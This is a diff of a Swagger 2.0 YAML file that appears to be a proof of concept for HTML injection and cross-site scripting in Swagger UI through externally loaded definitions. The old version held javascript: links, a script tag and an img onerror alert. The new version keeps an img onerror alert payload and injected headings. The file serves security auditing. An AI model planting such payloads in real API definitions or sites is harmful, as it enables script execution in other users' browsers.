@@ -1,22 +1,18 @@
 swagger: '2.0'
 info:
-  title: "Swagger UI HTML Injection Test"
+  title: "Security Audit: Proof of Concept"
   description: |
-    <h1>HTML Injection Successful</h1>
-    <p>If you see large text above, HTML injection is working.</p>
-    <marquee>Testing Marquee Tag</marquee>
-    <br>
-    <a href="javascript:alert('XSS Execution Successful')">Click here to test XSS</a>
-    <img src=x onerror="alert('Stored/DOM XSS Successful!')">
+    <h1>⚠️ HTML Injection Successful ⚠️</h1>
+    <p>This page is vulnerable to HTML Injection via external definition loading.</p>
+    <img src="x" onerror="alert('JavaScript Execution (XSS) Successful!');">
   version: "1.0.0"
   contact:
-    name: "Security Tester"
-    url: "javascript:alert('XSS in Contact URL')"
+    name: "Security Audit Team"
 paths:
-  /test-endpoint:
+  /audit-poc:
     get:
-      summary: "Test endpoint for injection"
-      description: "<h2>Injection in endpoint description!</h2><script>console.log('XSS')</script>"
+      summary: "Injected Endpoint"
+      description: "This endpoint was injected via an external YAML file."
       responses:
         '200':
-          description: "OK"
+          description: "Successful operation"
